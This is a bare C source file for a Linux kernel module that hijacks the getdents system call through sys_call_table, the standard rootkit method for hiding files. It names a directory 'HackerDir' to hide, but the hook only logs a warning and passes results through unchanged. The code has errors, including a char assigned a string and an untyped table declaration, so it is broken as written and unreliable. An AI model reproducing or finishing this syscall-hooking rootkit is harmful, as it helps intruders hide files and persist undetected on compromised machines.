#define MODULE
#define __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>

EXPORT_NO_SYMBOLS;
  //-------------------------------
  extern sys_call_table[];
  //-------------------------------
  int (* real_getdents) (uint, struct dirent *, uint);
  //-------------------------------
  int our_getdents(uint fd, struct dirent *dirp, uint count){
      unsigned int bytes_read, tmp;
      struct dirent *dirp2;
      char hiddenfile = "HackerDir";
      bytes_read = (*real_getdents) (fd, dirp, count);
		printk("<1>Warning! Getdents is hooked!\n");
      return bytes_read;
  }
  int init_module(void) {
      real_getdents = sys_call_table[SYS_getdents];
      sys_call_table[SYS_getdents] = our_getdents;
      return 0;
  }
  void cleanup_module(void) {
      sys_call_table[SYS_getdents] = real_getdents;
 }

